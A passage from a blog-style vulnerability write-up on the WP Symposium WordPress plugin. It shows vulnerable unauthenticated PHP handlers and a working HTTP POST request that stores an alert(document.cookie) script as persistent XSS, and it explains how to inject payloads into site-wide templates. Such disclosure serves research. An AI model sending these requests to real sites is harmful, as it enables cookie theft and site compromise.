class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sidebar-page.php'</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update guid</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_bloginfo</span><span class="crayon-sy">(</span><span class="crayon-s">'url'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-sy">[</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'/?p='</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET guid = '%s' WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-77"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0134 seconds] -->
<p>This long bit of code will effectively take in any arbitrary text input and add a new page with said input. As there&#8217;s no validation of the current user being authenticated, leave alone being an user with appropiate privileges to do this, we can exploit this to pull off a persistent XSS by adding a new page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a68bcb735892934" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

action=add_new_page&amp;name=Hello this is dog&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a68bcb735892934-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bcb735892934-2">2</div><div class="crayon-num" data-line="crayon-53c9878a68bcb735892934-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bcb735892934-4">4</div><div class="crayon-num" data-line="crayon-53c9878a68bcb735892934-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bcb735892934-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a68bcb735892934-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bcb735892934-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a68bcb735892934-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bcb735892934-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">93</span></div><div class="crayon-line" id="crayon-53c9878a68bcb735892934-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bcb735892934-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_new_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">Hello </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">dog</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0030 seconds] -->
<p><strong>Analysis of import_template_file vulnerability</strong><br />
The last vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is a bit more fun, because it does not directly touch the DB in this code. Rather, it uses the symposium_update_import_snippet function to extraplote a value to insert into the database through <a href="http://codex.wordpress.org/Function_Reference/update_option">update_option</a>. By being a bit crafty with our request, we can once again cause a persistent XSS due to a lack of validation of the calling user, since we can ship our payload into parts of the template, many of which are used by *most* pages.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a68bd4564029210" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "import_template_file") {

	$import_file = $_POST['import_file'];
	
	symposium_update_import_snippet("template_profile_header", $import_file);
	symposium_update_import_snippet("template_profile_body", $import_file);
	symposium_update_import_snippet("template_page_footer", $import_file);
	symposium_update_import_snippet("template_email", $import_file);
	symposium_update_import_snippet("template_forum_header", $import_file);
	symposium_update_import_snippet("template_mail", $import_file);
	symposium_update_import_snippet("template_mail_tray", $import_file);
	symposium_update_import_snippet("template_mail_message", $import_file);
	symposium_update_import_snippet("template_group", $import_file);
	symposium_update_import_snippet("template_forum_category", $import_file);
	symposium_update_import_snippet("template_forum_topic", $import_file);
	symposium_update_import_snippet("template_group_forum_category", $import_file);
	symposium_update_import_snippet("template_group_forum_topic", $import_file);

	echo 'OK';
	exit;
}
function symposium_update_import_snippet($tag, $import_file) {
	global $wpdb;
	$start = strpos($import_file, "&lt;!-- ".$tag." --&gt;") + strlen("&lt;!-- ".$tag." --&gt;")+1;
	$end = strpos($import_file, "&lt;!-- end_".$tag." --&gt;");
	$snippet = substr($import_file, $start, $end-$start-1);
	update_option('symposium_'.$tag, $snippet);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-2">2</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-4">4</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-6">6</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-8">8</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-10">10</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-12">12</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-14">14</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-16">16</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-18">18</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-20">20</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-22">22</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-24">24</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-26">26</div><div class="crayon-num" data-line="crayon-53c9878a68bd4564029210-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bd4564029210-28">28</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a68bd4564029210-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"import_template_file"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">import_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'import_file'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_body"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_page_footer"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_email"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_tray"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_message"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-18">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-22"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- end_"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">snippet</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-o">-</span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bd4564029210-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">update_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">snippet</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bd4564029210-28"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0096 seconds] -->
<p>In our request, we need to add a bit of whatespace around our payload to allow for a margin of error, because the way it does the substringing isn&#8217;t that nice. This request will show how to do a simple alert, which will show on most pages on the site.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a68bde342484334" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
